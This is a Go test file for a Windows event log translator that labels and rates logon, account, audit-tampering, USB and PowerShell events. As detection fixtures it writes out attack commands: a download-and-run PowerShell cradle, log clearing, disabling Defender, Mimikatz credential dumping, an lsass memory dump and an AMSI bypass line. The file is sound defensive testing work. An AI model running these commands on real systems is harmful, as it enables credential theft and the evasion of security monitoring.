package winevt

import (
	"encoding/base64"
	"fmt"
	"os"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode/utf16"

	"github.com/casea1/blackbox/internal/event"
)

// loadSample translates testdata/sample-events.xml and returns the
// events keyed by "EventID@HH:MM:SS" (UTC). Skipped raw events map to nil.
func loadSample(t *testing.T) map[string]*event.Event {
	t.Helper()
	f, err := os.Open("../../testdata/sample-events.xml")
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	tr := NewTranslator()
	out := map[string]*event.Event{}
	err = ParseStream(f, func(r *Raw) error {
		key := strconv.Itoa(r.EventID) + "@" + r.Time.Format("15:04:05")
		e := tr.Translate(r)
		if prev, ok := out[key]; ok && prev != nil && e == nil {
			return nil // keep the first translated event for duplicate keys
		}
		out[key] = e
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

func TestTranslateSample(t *testing.T) {
	ev := loadSample(t)
	cases := []struct {
		key      string
		cat      event.Category
		sev      event.Severity
		contains string
	}{
		{"4624@08:02:11", event.CatLogon, event.SevInfo, "jsmith logged on at the keyboard."},
		{"4624@09:15:30", event.CatLogon, event.SevInfo, "admin_jd logged on via Remote Desktop from 10.1.1.20 with administrator rights."},
		{"4672@09:15:30", event.CatPrivileged, event.SevLow, "admin_jd logged on via Remote Desktop from 10.1.1.20 with administrator privileges."},
		{"4625@10:02:01", event.CatFailedLogon, event.SevLow, "Failed logon for administrator over the network from 10.1.1.99 — wrong password."},
		{"4625@10:03:02", event.CatFailedLogon, event.SevLow, "the user name does not exist"},
		{"4625@10:03:10", event.CatFailedLogon, event.SevLow, "account is disabled"},
		{"4740@11:15:41", event.CatFailedLogon, event.SevMedium, "Account mjones was locked out"},
		{"4720@13:01:41", event.CatAccount, event.SevMedium, "admin_jd created the user account tempuser."},
		{"4732@13:02:05", event.CatAccount, event.SevHigh, "admin_jd added tempuser to the privileged group Administrators."},
		{"4688@13:01:40", event.CatPrivileged, event.SevLow, "admin_jd ran with administrator rights: net  user tempuser"},
		{"4688@16:38:00", event.CatPrivileged, event.SevHigh, "can clear logs or weaken auditing"},
		{"4719@13:20:00", event.CatIntegrity, event.SevHigh, `Audit policy for "Removable Storage" was changed by admin_jd`},
		{"4616@13:25:30", event.CatIntegrity, event.SevHigh, "moving the clock 2.0 hours back"}, // back: High (T3)
		{"1102@16:40:00", event.CatIntegrity, event.SevHigh, "The Security log was cleared by admin_jd."},
		{"104@16:38:00", event.CatIntegrity, event.SevHigh, "The Application log was cleared by admin_jd."},
		{"4648@15:40:12", event.CatPrivileged, event.SevMedium, "jsmith used the credentials of admin_jd (RunAs"},
		{"4698@13:10:00", event.CatOther, event.SevMedium, `Scheduled task \Updater was created by admin_jd.`},
		{"7045@13:12:00", event.CatOther, event.SevMedium, "UpdaterSvc"},
		{"1006@08:30:03", event.CatRemovable, event.SevMedium, "USB storage connected: SanDisk Cruzer Blade (serial 4C530001231109115405), 15.6 GB."},
		{"1006@08:55:40", event.CatRemovable, event.SevInfo, "Removable storage disconnected: SanDisk Cruzer Blade"},
		{"1006@16:50:00", event.CatRemovable, event.SevMedium, "virtual disk (ISO/VHD file) was mounted"},
		{"6416@08:30:02", event.CatRemovable, event.SevMedium, "Removable device connected: SanDisk Cruzer Blade (serial 4C530001231109115405)."},
		{"400@08:30:01", event.CatRemovable, event.SevMedium, "SanDisk Cruzer Blade"},
		{"4663@08:41:15", event.CatRemovable, event.SevMedium, `jsmith wrote to removable media: \Device\HarddiskVolume7\Projects\budget-2027.xlsx (using EXCEL.EXE).`},
		{"4656@16:56:00", event.CatRemovable, event.SevMedium, "jsmith was blocked from accessing removable media"},
		{"1116@08:42:05", event.CatOther, event.SevHigh, `HackTool:Win32/Keygen in E:\tools\keygen.exe`},
		{"5001@16:58:00", event.CatOther, event.SevHigh, "real-time protection was turned off"},
		{"1074@17:06:00", event.CatIntegrity, event.SevInfo, "admin_jd initiated a restart using shutdown.exe — Other (Planned)."},
		{"6008@07:52:40", event.CatIntegrity, event.SevLow, "shut down unexpectedly"},
	}
	for _, c := range cases {
		e := ev[c.key]
		if e == nil {
			t.Errorf("%s: not translated", c.key)
			continue
		}
		if e.Category != c.cat || e.Severity != c.sev {
			t.Errorf("%s: got %s/%s, want %s/%s", c.key, e.Category, e.Severity, c.cat, c.sev)
		}
		if !strings.Contains(e.Summary, c.contains) {
			t.Errorf("%s: summary %q does not contain %q", c.key, e.Summary, c.contains)
		}
		if e.Host != "WS-07" || e.OS != "windows" || e.Time.IsZero() {
			t.Errorf("%s: missing host/os/time: %+v", c.key, e)
		}
	}

	// Routine noise must be dropped.
	for _, key := range []string{
		"4624@07:58:05", // SYSTEM service logon
		"4672@07:58:05", // SYSTEM special privileges
		"4616@07:59:10", // Windows Time service clock sync
		"4688@08:03:00", // non-elevated notepad
		"5156@08:10:00", // firewall connection noise
		"7036@07:58:30", // service state change
		"1006@07:58:03", // internal system disk
	} {
		if e, ok := ev[key]; !ok {
			t.Errorf("%s: missing from sample", key)
		} else if e != nil {
			t.Errorf("%s: should be dropped, got %q", key, e.Summary)
		}
	}
}

func TestParseStreamBareSequence(t *testing.T) {
	// wevtutil qe /f:xml emits events with no root element.
	in := `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4740</EventID><TimeCreated SystemTime="2026-09-28T11:15:41.1Z"/><EventRecordID>7</EventRecordID><Channel>Security</Channel><Computer>ws-07.corp.local</Computer></System><EventData><Data Name="TargetUserName">mjones</Data></EventData></Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="EventLog"/><EventID Qualifiers="32768">6008</EventID><TimeCreated SystemTime="2026-09-28T07:52:40Z"/><EventRecordID>8</EventRecordID><Channel>System</Channel><Computer>ws-07.corp.local</Computer></System><EventData><Data>7:52:10 AM</Data><Data>9/28/2026</Data></EventData></Event>`
	var got []*Raw
	if err := ParseStream(strings.NewReader(in), func(r *Raw) error { got = append(got, r); return nil }); err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 {
		t.Fatalf("got %d events, want 2", len(got))
	}
	if got[0].EventID != 4740 || got[0].RecordID != 7 || got[0].Get("TargetUserName") != "mjones" {
		t.Errorf("event 0 parsed wrong: %+v", got[0])
	}
	if got[1].EventID != 6008 || got[1].Get("Data0") != "7:52:10 AM" || got[1].Get("Data1") != "9/28/2026" {
		t.Errorf("event 1 parsed wrong: %+v", got[1])
	}
	if shortHost(got[0].Computer) != "WS-07" {
		t.Errorf("shortHost = %q", shortHost(got[0].Computer))
	}
}

func TestParseDeviceID(t *testing.T) {
	cases := []struct {
		id, vendor, product, serial string
		storage                     bool
	}{
		{`USBSTOR\Disk&Ven_SanDisk&Prod_Cruzer_Blade&Rev_1.00\4C530001231109115405&0`, "SanDisk", "Cruzer Blade", "4C530001231109115405", true},
		{`USB\VID_0781&PID_5567\4C530001231109115405`, "", "", "4C530001231109115405", false},
		{`USB\VID_046D&PID_C52B\6&2c0f7b2&0&1`, "", "", "", false}, // generated instance ID, not a serial
		{`SWD\WPDBUSENUM\_??_USBSTOR#DISK&VEN_KINGSTON&PROD_DT&REV_PMAP#E0D55EA5&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}`, "KINGSTON", "DT", "", true},
	}
	for _, c := range cases {
		d := parseDeviceID(c.id)
		if d.vendor != c.vendor || d.product != c.product || d.serial != c.serial || d.storage != c.storage {
			t.Errorf("parseDeviceID(%q) = %+v", c.id, d)
		}
	}
}

func TestFailureReason(t *testing.T) {
	cases := map[[2]string]string{
		{"0xC000006D", "0xC000006A"}: "wrong password",
		{"0xc000006d", "0xc0000064"}: "the user name does not exist",
		{"0xC0000234", "0x0"}:        "account is locked out",
		{"0xC000006D", ""}:           "bad user name or password",
		{"0xDEADBEEF", "0x0"}:        "error code 0xdeadbeef",
	}
	for in, want := range cases {
		if got := failureReason(in[0], in[1]); got != want {
			t.Errorf("failureReason(%q,%q) = %q, want %q", in[0], in[1], got, want)
		}
	}
}

func TestIsServiceAccount(t *testing.T) {
	tr := NewTranslator()
	yes := [][2]string{{"S-1-5-18", "WS-07$"}, {"S-1-5-19", "LOCAL SERVICE"}, {"S-1-5-90-0-1", "DWM-1"},
		// W2: OpenSSH for Windows' per-connection virtual account.
		{"S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-6052", "sshd_6052"}, {"", "sshd_6052"}}
	for _, a := range yes {
		if !tr.isServiceAccount(a[0], a[1]) {
			t.Errorf("isServiceAccount(%v) = false", a)
		}
	}
	for _, name := range []string{"jsmith", "sshd", "sshd_admin", "sshd_"} {
		if tr.isServiceAccount("S-1-5-21-1-2-3-1001", name) {
			t.Errorf("%s treated as a service account", name)
		}
	}
}

// D2: a name ending in "$" is left out only when it is a computer
// account: this computer's own, or one from a domain. A local account
// named like one (bbhid$, made an administrator) keeps its logon and its
// administrator-rights events.
func TestDollarAccounts(t *testing.T) {
	tr := NewTranslator()
	acct := func(name, domain string) map[string]string {
		return map[string]string{"TargetUserSid": "S-1-5-21-1-2-3-1009", "TargetUserName": name, "TargetDomainName": domain,
			"SubjectUserSid": "S-1-5-21-1-2-3-1009", "SubjectUserName": name, "SubjectDomainName": domain,
			"LogonType": "3", "IpAddress": "10.1.1.50", "PrivilegeList": "SeDebugPrivilege"}
	}
	for _, id := range []int{4624, 4672} {
		if e := tr.Translate(sec(id, acct("bbhid$", "WS-07"))); e == nil {
			t.Errorf("%d for the local account bbhid$ was dropped", id)
		}
		if e := tr.Translate(sec(id, acct("WS-07$", "CORP"))); e != nil {
			t.Errorf("%d for this computer's own account was kept: %s", id, e.Summary)
		}
		if e := tr.Translate(sec(id, acct("FILESRV$", "CORP"))); e != nil {
			t.Errorf("%d for a domain computer account was kept: %s", id, e.Summary)
		}
	}
}

// sec builds a Security event for tests.
func sec(id int, data map[string]string) *Raw {
	return &Raw{Provider: "Microsoft-Windows-Security-Auditing", Channel: "Security", EventID: id,
		Computer: "WS-07", Time: time.Date(2026, 9, 29, 9, 0, 0, 0, time.UTC), Data: data}
}

func TestAdmToolkitCompatibility(t *testing.T) {
	tr := NewTranslator()
	user := map[string]string{"TargetUserSid": "S-1-5-21-1-2-3-1001", "TargetUserName": "jdoe.adm", "TargetDomainName": "WS-07"}
	with := func(extra map[string]string) map[string]string {
		m := map[string]string{}
		for k, v := range user {
			m[k] = v
		}
		for k, v := range extra {
			m[k] = v
		}
		return m
	}

	// A session ended by an administrator (logoff.exe) or a time limit
	// produces 4634 only; a user-chosen logoff also produces 4647, which
	// wins the merge.
	ended := tr.Translate(sec(4634, with(map[string]string{"LogonType": "10", "TargetLogonId": "0x3E7A1"})))
	if ended == nil || !strings.Contains(ended.Summary, "session ended") || ended.DedupeKey != "logoff|0x3e7a1" {
		t.Errorf("4634: %+v", ended)
	}
	chosen := tr.Translate(sec(4647, with(map[string]string{"TargetLogonId": "0x3E7A1"})))
	if chosen == nil || chosen.DedupeKey != ended.DedupeKey || chosen.Priority <= ended.Priority {
		t.Errorf("4647 should merge with and win over 4634: %+v", chosen)
	}
	if tr.Translate(sec(4634, with(map[string]string{"LogonType": "3", "TargetLogonId": "0x1"}))) != nil {
		t.Error("network logoffs (type 3) are noise and must be skipped")
	}

	// A cached unlock (type 13) is an unlock, like type 7.
	if e := tr.Translate(sec(4624, with(map[string]string{"LogonType": "13", "TargetLogonId": "0x2"}))); e == nil || !e.Interactive {
		t.Errorf("type 13: %+v", e)
	}

	// An administrator's UAC logon pair is one logon.
	a := tr.Translate(sec(4624, with(map[string]string{"LogonType": "2", "TargetLogonId": "0x100", "TargetLinkedLogonId": "0x200", "ElevatedToken": "%%1842"})))
	b := tr.Translate(sec(4624, with(map[string]string{"LogonType": "2", "TargetLogonId": "0x200", "TargetLinkedLogonId": "0x100", "ElevatedToken": "%%1843"})))
	if a.DedupeKey == "" || a.DedupeKey != b.DedupeKey || a.Priority <= b.Priority {
		t.Errorf("linked logons: %q/%d and %q/%d", a.DedupeKey, a.Priority, b.DedupeKey, b.Priority)
	}

	// OpenSSH logons say SSH, not "clear-text password".
	ssh := tr.Translate(sec(4624, with(map[string]string{"LogonType": "8", "TargetLogonId": "0x3", "LogonProcessName": "sshd", "IpAddress": "10.1.1.5"})))
	if ssh == nil || !strings.Contains(ssh.Summary, "via SSH") || strings.Contains(ssh.Summary, "clear-text") {
		t.Errorf("sshd logon: %+v", ssh)
	}

	// Actions by the system itself are shown as SYSTEM, not the computer account.
	grp := tr.Translate(sec(4731, map[string]string{"SubjectUserSid": "S-1-5-18", "SubjectUserName": "WS-07$", "SubjectDomainName": "WORKGROUP",
		"TargetUserName": "Blackbox Senders", "TargetDomainName": "WS-07", "TargetSid": "S-1-5-21-1-2-3-1010"}))
	if grp == nil || !strings.HasPrefix(grp.Summary, "SYSTEM ") {
		t.Errorf("system action: %+v", grp)
	}

	// PowerShell -EncodedCommand (remote management) is decoded, checked
	// for tampering, and passwords in it are hidden.
	enc := base64.StdEncoding.EncodeToString(utf16le("$env:BLACKBOX_SHARE_PASSWORD='Qx7!Harbor-L26'; wevtutil cl Security"))
	p := tr.Translate(sec(4688, map[string]string{"SubjectUserSid": "S-1-5-21-1-2-3-1001", "SubjectUserName": "jdoe.adm", "SubjectDomainName": "WS-07",
		"NewProcessName": `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "TokenElevationType": "%%1937",
		"CommandLine": "powershell.exe -NoProfile -EncodedCommand " + enc, "ParentProcessName": `C:\Windows\System32\wsmprovhost.exe`}))
	if p == nil || p.Action != "audit_tamper_command" || !strings.Contains(p.Summary, "wevtutil cl Security") {
		t.Fatalf("encoded command: %+v", p)
	}
	all := p.Summary
	for _, d := range p.Details {
		all += " " + d.Value
	}
	if strings.Contains(all, "Qx7!Harbor-L26") {
		t.Errorf("password shown in the report: %s", all)
	}
}

// ps builds a PowerShell script block (4104) event for tests.
func ps(level int, id, part, total, text string) *Raw {
	return &Raw{Provider: "Microsoft-Windows-PowerShell", Channel: "Microsoft-Windows-PowerShell/Operational", EventID: 4104,
		Level: level, Computer: "WS-07", UserSID: "S-1-5-21-1-2-3-1001", Time: time.Date(2026, 9, 29, 9, 0, 0, 0, time.UTC),
		Data: map[string]string{"MessageNumber": part, "MessageTotal": total, "ScriptBlockText": text,
			"ScriptBlockId": id, "Path": `C:\Users\jsmith\run.ps1`}}
}

func TestPowerShellScriptBlocks(t *testing.T) {
	tr := NewTranslator()
	tr.ResolveSID = func(sid string) string {
		if sid == "S-1-5-21-1-2-3-1001" {
			return "jsmith"
		}
		return ""
	}

	// Routine scripts are not reported.
	if e := tr.Translate(ps(5, "a1", "1", "1", `Get-ChildItem C:\Temp | Where-Object Length -gt 1MB`)); e != nil {
		t.Errorf("benign script reported: %+v", e)
	}
	// Module logging is skipped.
	mod := ps(4, "", "", "", "")
	mod.EventID = 4103
	if e := tr.Translate(mod); e != nil {
		t.Errorf("4103 reported: %+v", e)
	}

	// Script blocks PowerShell flags itself (warning level) are Medium.
	w := tr.Translate(ps(3, "a2", "1", "1", "$k = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, $t)"))
	if w == nil || w.Action != "powershell_suspicious" || w.Severity != event.SevMedium || w.User != "jsmith" ||
		!strings.Contains(w.Summary, "jsmith ran the script run.ps1 (C:\\Users\\jsmith\\run.ps1), which PowerShell flagged as suspicious for using GetDelegateForFunctionPointer (calling raw Windows functions)") {
		t.Errorf("warning-level script block: %+v", w)
	}

	// Windows' own generated modules (here, Defender's commands) are not
	// reported, even though PowerShell flags them.
	cdxml := ps(3, "a3", "1", "1", "#requires -version 3.0\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n"+
		"$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpScan'\n"+
		"$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\n")
	cdxml.Data["Path"] = ""
	if e := tr.Translate(cdxml); e != nil {
		t.Errorf("Windows' generated Defender module reported: %+v", e)
	}
	// A script typed at the prompt is named by its first line.
	typed := ps(3, "a4", "1", "1", "\n$x = [Runtime.InteropServices.Marshal]::AllocHGlobal(10)")
	typed.Data["Path"] = ""
	if e := tr.Translate(typed); e == nil || !strings.Contains(e.Target, "typed or run from memory ($x = [Runtime") {
		t.Errorf("typed script: %+v", e)
	}

	cases := []struct {
		text, action, line string
		cat                event.Category
	}{
		{"$u = 'http://10.1.1.9/a.ps1'\n(New-Object Net.WebClient).DownloadString($u) | IEX", "powershell_download", "(New-Object Net.WebClient).DownloadString($u) | IEX", event.CatOther},
		{"iex ([Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b)))", "powershell_download", "iex (", event.CatOther},
		{"Write-Host 'cleanup'\nwevtutil   cl Security\n", "powershell_tamper", "wevtutil   cl Security", event.CatIntegrity},
		{"Stop-Service -Name EventLog -Force", "powershell_tamper", "Stop-Service -Name EventLog", event.CatIntegrity},
		{"Set-MpPreference -DisableRealtimeMonitoring $true", "powershell_av_tamper", "Set-MpPreference -DisableRealtimeMonitoring $true", event.CatOther},
		{`Add-MpPreference -ExclusionPath C:\Users\Public`, "powershell_av_tamper", "Add-MpPreference", event.CatOther},
		{"Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'", "powershell_credential", "Invoke-Mimikatz", event.CatOther},
		{`Get-Process lsass | Out-Minidump -DumpFilePath C:\Temp`, "powershell_credential", "Out-Minidump", event.CatOther},
		{"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", "powershell_amsi_bypass", "AmsiUtils", event.CatOther},
	}
	for _, c := range cases {
		e := tr.Translate(ps(5, "b1", "1", "1", c.text))
		if e == nil || e.Action != c.action || e.Severity != event.SevHigh || e.Category != c.cat ||
			!strings.HasPrefix(e.Summary, "jsmith ran the script run.ps1 (C:\\Users\\jsmith\\run.ps1), which ") || !strings.Contains(e.Summary, c.line) {
			t.Errorf("%q: %+v", c.text, e)
		}
	}

	// Re-enabling Defender, and downloading without running, are not reported.
	for _, text := range []string{"Set-MpPreference -DisableRealtimeMonitoring $false",
		"Invoke-WebRequest https://intranet/setup.msi -OutFile setup.msi"} {
		if e := tr.Translate(ps(5, "c1", "1", "1", text)); e != nil {
			t.Errorf("%q reported: %+v", text, e)
		}
	}

	// Passwords in a script are hidden in the summary and details.
	pw := tr.Translate(ps(5, "d1", "1", "1", "$env:DB_PASSWORD='Qx7!Harbor'; $p = ConvertTo-SecureString 'P@ssw0rd!9' -AsPlainText -Force; wevtutil cl System"))
	if pw == nil || !strings.Contains(pw.Summary, "********") {
		t.Fatalf("tamper script with a password: %+v", pw)
	}
	all := pw.Summary
	for _, d := range pw.Details {
		all += " " + d.Value
	}
	for _, v := range pw.Fields {
		all += " " + v
	}
	if strings.Contains(all, "Qx7!Harbor") || strings.Contains(all, "P@ssw0rd!9") {
		t.Errorf("password shown in the report: %s", all)
	}
	if !hasDetail(pw, "Script (excerpt)") || !hasDetail(pw, "Script path") || !hasDetail(pw, "Script block ID") {
		t.Errorf("details: %+v", pw.Details)
	}

	// Matching parts of one large script share a key, so they become one row.
	p1 := tr.Translate(ps(5, "{E1B2}", "1", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x/1')"))
	p2 := tr.Translate(ps(5, "{E1B2}", "3", "3", "Clear-EventLog -LogName Security"))
	if p1 == nil || p2 == nil || p1.DedupeKey == "" || p1.DedupeKey != p2.DedupeKey {
		t.Errorf("parts of one script block: %+v / %+v", p1, p2)
	}
}

func hasDetail(e *event.Event, label string) bool {
	for _, d := range e.Details {
		if d.Label == label && d.Value != "" {
			return true
		}
	}
	return false
}

func utf16le(s string) []byte {
	var b []byte
	for _, r := range utf16.Encode([]rune(s)) {
		b = append(b, byte(r), byte(r>>8))
	}
	return b
}

func elevatedRun(cmd string) *Raw {
	return sec(4688, map[string]string{"SubjectUserSid": "S-1-5-21-1-2-3-1001", "SubjectUserName": "mallory", "SubjectDomainName": "WS-07",
		"NewProcessName": `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "CommandLine": cmd,
		"TokenElevationType": "%%1937", "ParentProcessName": `C:\Windows\explorer.exe`})
}

// D4: PowerShell run hidden and around the script policy is flagged even
// when the script itself looks harmless; one such switch alone is not.
func TestHiddenPowerShell(t *testing.T) {
	tr := NewTranslator()
	enc := "dwBoAG8AYQBtAGkA" // "whoami"
	for cmd, want := range map[string]string{
		`powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ` + enc: "hidden_powershell",
		`"powershell.exe" -w hidden -nop -noni -c Get-Date`:                                 "hidden_powershell",
		`powershell.exe -ep bypass -file C:\Scripts\backup.ps1`:                             "elevated_process",
		`powershell.exe -NoProfile -Command Get-Service`:                                    "elevated_process",
	} {
		e := tr.Translate(elevatedRun(cmd))
		if e == nil || e.Action != want {
			t.Errorf("%s: got %v, want %s", cmd, e, want)
			continue
		}
		if want == "hidden_powershell" && e.Severity != event.SevMedium {
			t.Errorf("%s: severity %s, want medium", cmd, e.Severity)
		}
	}
}

// D9: log clearing and auditpol are caught when PowerShell quotes the
// program's path.
func TestQuotedTamperCommands(t *testing.T) {
	tr := NewTranslator()
	for _, cmd := range []string{`"C:\Windows\system32\wevtutil.exe" cl Security`, `"C:\Windows\System32\auditpol.exe" /set /subcategory:"Logon" /success:disable`} {
		r := elevatedRun(cmd)
		r.Data["NewProcessName"] = strings.Trim(strings.Fields(cmd)[0], `"`)
		if e := tr.Translate(r); e == nil || e.Action != "audit_tamper_command" || e.Severity != event.SevHigh {
			t.Errorf("%s: got %+v", cmd, e)
		}
	}
}

// D9: SYSTEM turning auditing on is Group Policy at work; turning it off
// stays High, since anyone running auditpol as SYSTEM looks the same.
func TestAuditPolicyBySystem(t *testing.T) {
	tr := NewTranslator()
	pol := func(change string) *Raw {
		return sec(4719, map[string]string{"SubjectUserSid": "S-1-5-18", "SubjectUserName": "WS-07$", "SubjectDomainName": "CORP",
			"SubcategoryGuid": "{0CCE9215-69AE-11D9-BED3-505054503030}", "AuditPolicyChanges": change})
	}
	if e := tr.Translate(pol("%%8449")); e == nil || e.Severity != event.SevMedium {
		t.Errorf("success added by SYSTEM: %+v", e)
	}
	if e := tr.Translate(pol("%%8448, %%8450")); e == nil || e.Severity != event.SevHigh {
		t.Errorf("auditing removed by SYSTEM: %+v", e)
	}
}

// W3: Get-NetFirewallRule loads NetSecurity's CDXML-generated module,
// logged as a warning in three parts; only the first names the CIM class.
// None is a row, and a real suspicious script still is.
func TestCDXMLModuleParts(t *testing.T) {
	tr := NewTranslator()
	part1 := "# Localized NetSecurity\n$__cmdletization_objectModelWrapper = Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter\n" +
		"[Microsoft.PowerShell.Cmdletization.Xml]\n$ClassName = 'root/standardcimv2/MSFT_NetFirewallRule'"
	part2 := "$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\n[System.Runtime.InteropServices.Marshal]::SizeOf($x)"
	part3 := "$__cmdletization_queryBuilder.FilterByProperty('Enabled', $Enabled)\n# GetMethod reflection helper"
	for i, text := range []string{part1, part2, part3} {
		if e := tr.Translate(ps(3, "{6f1c}", fmt.Sprint(i+1), "3", text)); e != nil {
			t.Errorf("part %d: %s", i+1, e.Summary)
		}
	}
	// Another script with the same words but no generated code: reported.
	if e := tr.Translate(ps(3, "{7a2d}", "1", "1", "[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $p, 10)\nVirtualAlloc")); e == nil {
		t.Error("suspicious script not reported")
	}
}

// W4: Windows setup "renames" accounts to the same name and adds a new
// account to its default primary group "None": neither is a row.
func TestOOBEAccountNoise(t *testing.T) {
	tr := NewTranslator()
	raw := func(id int, data map[string]string) *Raw {
		data["SubjectUserName"], data["SubjectUserSid"], data["SubjectDomainName"] = "SYSTEM", "S-1-5-18", "NT AUTHORITY"
		return &Raw{Provider: "Microsoft-Windows-Security-Auditing", Channel: "Security", EventID: id, Computer: "SRV25",
			Time: time.Date(2026, 10, 4, 9, 0, 0, 0, time.UTC), Data: data}
	}
	if e := tr.Translate(raw(4781, map[string]string{"OldTargetUserName": "Administrator", "NewTargetUserName": "Administrator", "TargetSid": "S-1-5-21-9-9-9-500"})); e != nil {
		t.Errorf("same-name rename: %s", e.Summary)
	}
	if e := tr.Translate(raw(4781, map[string]string{"OldTargetUserName": "Administrator", "NewTargetUserName": "admin2", "TargetSid": "S-1-5-21-9-9-9-500"})); e == nil {
		t.Error("real rename not reported")
	}
	if e := tr.Translate(raw(4728, map[string]string{"TargetUserName": "None", "TargetSid": "S-1-5-21-9-9-9-513", "MemberSid": "S-1-5-21-9-9-9-1001", "MemberName": "-"})); e != nil {
		t.Errorf("primary group: %s", e.Summary)
	}
}

// TIME1: each Set-Date also logs a 4616 that moves the clock by less than
// a second; it is not a row.
func TestZeroTimeChange(t *testing.T) {
	tr := NewTranslator()
	data := map[string]string{"SubjectUserSid": "S-1-5-21-1-2-3-1001", "SubjectUserName": "claude", "SubjectDomainName": "WS-07",
		"PreviousTime": "2026-10-07T13:00:00.1000000Z", "NewTime": "2026-10-07T13:00:00.4000000Z", "ProcessName": `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`}
	if e := tr.Translate(sec(4616, data)); e != nil {
		t.Errorf("zero change kept: %s", e.Summary)
	}
	data["NewTime"] = "2026-10-07T13:30:00.1000000Z"
	if e := tr.Translate(sec(4616, data)); e == nil || !strings.Contains(e.Summary, "30 minutes forward") {
		t.Errorf("30-minute change: %+v", e)
	}
}

// UX8: sshd's "Accepted … from <address>" is kept, to give the SSH logon
// its address; its other lines are not rows.
func TestOpenSSHAccepted(t *testing.T) {
	tr := NewTranslator()
	raw := func(msg string) *Raw {
		return &Raw{Provider: "OpenSSH", Channel: "OpenSSH/Operational", EventID: 4, Computer: "WIN11-TEST",
			Time: time.Date(2026, 10, 7, 13, 0, 0, 0, time.UTC), Data: map[string]string{"process": "sshd.exe", "payload": msg}}
	}
	e := tr.Translate(raw("Accepted publickey for claude from 10.1.1.20 port 50114 ssh2: ED25519 SHA256:abc"))
	if e == nil || e.Action != "ssh_accepted" || e.SourceIP != "10.1.1.20" || e.User != joinAccount("WIN11-TEST", "claude", "WIN11-TEST") {
		t.Fatalf("accepted: %+v", e)
	}
	if e := tr.Translate(raw("Connection closed by 10.1.1.20 port 50114")); e != nil {
		t.Errorf("other sshd line kept: %s", e.Summary)
	}
}

// UI21: PowerShell run with -File reads "ran the script <path>"; a
// -File after -Command is part of the command.
func TestPowerShellScriptSummary(t *testing.T) {
	tr := NewTranslator()
	for cmd, want := range map[string]string{
		`powershell.exe -ep bypass -file C:\Scripts\backup.ps1`:            `mallory ran the script C:\Scripts\backup.ps1 with administrator rights (PowerShell).`,
		`"powershell.exe" -NoProfile -File "C:\My Scripts\a b.ps1" -Force`: `mallory ran the script C:\My Scripts\a b.ps1 with administrator rights (PowerShell).`,
		`powershell.exe -w hidden -ep bypass -noni -f C:\x.ps1`:            `mallory ran the script C:\x.ps1 hidden from view and around the script policy: powershell.exe -w hidden -ep bypass -noni -f C:\x.ps1`,
		`powershell.exe -Command Get-Content -File C:\notes.txt`:           `mallory ran with administrator rights: powershell.exe -Command Get-Content -File C:\notes.txt`,
		`powershell.exe -NoProfile -Command Get-Service`:                   `mallory ran with administrator rights: powershell.exe -NoProfile -Command Get-Service`,
	} {
		e := tr.Translate(elevatedRun(cmd))
		if e == nil || e.Summary != want {
			t.Errorf("%s:\n got %v\nwant %s", cmd, e, want)
		}
	}
}

// UI21: a 4648 with no process name leaves out "to run".
func TestExplicitCredsNoProcess(t *testing.T) {
	tr := NewTranslator()
	for _, proc := range []string{"", "-"} {
		e := tr.Translate(sec(4648, map[string]string{"SubjectUserSid": "S-1-5-21-1-2-3-1001", "SubjectUserName": "jsmith", "SubjectDomainName": "WS-07",
			"TargetUserName": "admin_jd", "TargetDomainName": "WS-07", "ProcessName": proc}))
		if e == nil || strings.Contains(e.Summary, "to run") || e.Summary != "jsmith used the credentials of admin_jd (RunAs / alternate credentials)." {
			t.Errorf("%q: %v", proc, e)
		}
	}
	e := tr.Translate(sec(4648, map[string]string{"SubjectUserSid": "S-1-5-21-1-2-3-1001", "SubjectUserName": "jsmith", "SubjectDomainName": "WS-07",
		"TargetUserName": "admin_jd", "TargetDomainName": "WS-07", "ProcessName": `C:\Windows\System32\mmc.exe`}))
	if e == nil || !strings.Contains(e.Summary, " to run mmc.exe ") {
		t.Errorf("with a process: %v", e)
	}
}
